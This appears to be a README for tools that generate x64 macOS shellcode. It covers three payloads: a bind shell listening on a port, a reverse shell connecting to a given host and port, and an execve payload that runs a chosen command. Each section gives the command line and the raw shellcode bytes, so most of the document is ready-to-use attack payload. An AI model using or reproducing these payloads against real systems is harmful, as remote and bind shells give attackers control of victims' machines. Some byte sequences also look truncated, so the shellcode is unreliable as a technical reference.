# macOS Shellcoding

In this repository are three helper tools designed to automate shellcode generation for bind, reverse and execve shellcode on macOS.

Each script outputs a compiled macho64 binary of the payload along with the asm file.

The instructions on how to use these scripts to create your own custom shellcode is as follows.

## bind

Creates a bind shell payload which will listen on the specified port on all local interfaces for connections.

```bash
python3 macOS_bind_shell_x64.py -h
usage: macOS_bind_shell_x64.py [-h] [-p PORT]

Generate x64 macOS bind shell shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  Local port for TCP bind shell to listen on.
```

To create a bind shell which will listen on port 4444:

```shell
python3 macOS_bind_shell_x64.py -p 4444
[*] Generating shellcode for x64 macOS bind shell on port 4444
[*] Shellcode length: 153 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x61\x58\x48\x0f\xba\xe8\x19\x0f\x05\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x56\xbe\x01\x02\x11\x5c\xff\xce\x56\x54\x5e\x6a\x10\x5a\x6a\x68\x58\x48\x0f\xba\xe8\x19\x0f\x05\x4c\x89\xcf\x48\x31\xf6\x6a\x6a\x58\x48\x0f\xba\xe8\x19\x0f\x05\x4c\x89\xcf\x48\x31\xf6\x48\x31\xd2\x6a\x1e\x58\x48\x0f\xba\xe8\x19\x0f\x05\x49\x89\xc2\x4c\x89\xd7\x48\x31\xf6\x6a\x5a\x58\x48\x0f\xba\xe8\x19\x49\x89\xc1\x0f\x05\x48\xff\xc6\x4c\x89\xc8\x0f\x05\x48\xff\xc6\x4c\x89\xc8\x0f\x05\x48\x31\xd2\x52\x48\xbb\x2f\x62\x69\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x48\x0f\xba\xe8\x19\x0f\x05"
```

## reverse

Creates a reverse shell payload which will initiate a connection to the specified host on the specified port.

```shell
python3 macOS_reverse_shell_x64.py -h
usage: macOS_reverse_shell_x64.py [-h] [-l LHOST] [-p PORT]

Generate x64 macOS reverse shell shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -l LHOST, --lhost LHOST
                        Remote IPv4 address for TCP reverse shell to connect
                        to.
  -p PORT, --port PORT  Remote port for TCP reverse shell to connect to.
```

To create a reverse shell which will connect to host 127.0.0.1 on port 1337:

```shell
python3 macOS_reverse_shell_x64.py -l 127.0.0.1 -p 1337
[*] Generating shellcode for x64 macOS reverse shell on 127.0.0.1:1337
[*] Shellcode length: 113 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x6a\x02\x5f\x6a\x01\x5e\x48\x31\xd2\x6a\x61\x58\x48\x0f\xba\xe8\x19\x0f\x05\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x56\x48\xbe\x01\x02\x05\x48\xff\xce\x56\x54\x5e\x6a\x10\x5a\x6a\x62\x58\x48\x0f\xba\xe8\x19\x0f\x05\x48\x31\xf6\x6a\x5a\x58\x48\x0f\xba\xe8\x19\x49\x89\xc1\x0f\x05\x48\xff\xc6\x4c\x89\xc8\x0f\x05\x48\xff\xc6\x4c\x89\xc8\x0f\x05\x48\x31\xd2\x52\x48\xbb\x2f\x62\x69\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x6a\x3b\x58\x48\x0f\xba\xe8\x19\x0f\x05"
```


## execve

Creates an execve shellcode payload which will execute the command specified.

```shell
python3 macOS_execv_x64.py -h
usage: macOS_execv_x64.py [-h] [-c COMMAND]

Generate x64 macOS execv shellcode.

optional arguments:
  -h, --help            show this help message and exit
  -c COMMAND, --command COMMAND
                        Shell command to generate shellcode
```

To create a payload which will execute the 'whoami' command:

```shell
python3 macOS_execv_x64.py -c 'whoami'
[*] Command converted into hex: 696d616f6877
[*] Command length: 12
[*] Generating shellcode for x64 macOS execv command 'whoami'
[*] Shellcode length: 63 bytes
[*] Checking for NULL bytes...
[+] No NULL bytes detected!
"\x48\x31\xd2\x52\x48\xbb\x2f\x62\x69\x53\x48\x89\xe7\x48\x31\xdb\x66\xbb\x2d\x63\x53\x48\x89\xe3\x48\x31\xd2\x52\x48\xba\x6e\x2f\x77\x52\x48\xba\x2f\x2f\x75\x52\x48\x89\xe6\x48\x31\xd2\x52\x56\x53\x57\x48\x89\xe6\x6a\x3b\x58\x48\x0f\xba\xe8\x19\x0f\x05"
```
